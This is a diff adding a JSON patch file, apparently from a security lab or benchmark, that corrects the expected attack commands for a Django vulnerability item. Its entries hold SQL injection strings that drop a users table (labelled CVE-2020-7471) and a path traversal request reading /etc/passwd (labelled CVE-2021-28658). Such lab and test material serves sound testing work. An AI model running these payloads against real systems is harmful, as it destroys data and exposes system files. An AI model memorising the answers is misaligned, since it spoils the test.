@@ -1,0 +1,22 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "django-vuln",
+   "patches": [
+    {
+     "area": "execution",
+     "index": 0,
+     "expectedCommand": "# CVE-2020-7471\nModel.objects.filter(data__contains={\"key\": \"value; DROP TABLE users;--\"})\nModel.objects.filter(tags__contains=[\"tag'); DROP TABLE users;--\"])",
+     "command": "# CVE-2020-7471\nfrom django.contrib.postgres.aggregates import StringAgg\nModel.objects.annotate(x=StringAgg('name', delimiter=\"-' DROP TABLE users;--\"))"
+    },
+    {
+     "area": "execution",
+     "index": 3,
+     "expectedCommand": "# CVE-2021-28658\nGET /static/../../../../etc/passwd\ncurl --path-as-is http://{LAB_APP}/static/../../../../etc/passwd",
+     "command": "# 静态目录路径遍历通用探针（对照 CVE-2021-28658 时应验证 collectstatic 对符号链接目录的处理，而非运行期 URL 穿越）\nGET /static/../../../../etc/passwd\ncurl --path-as-is http://{LAB_APP}/static/../../../../etc/passwd"
+    }
+   ]
+  }
+ ]
+}
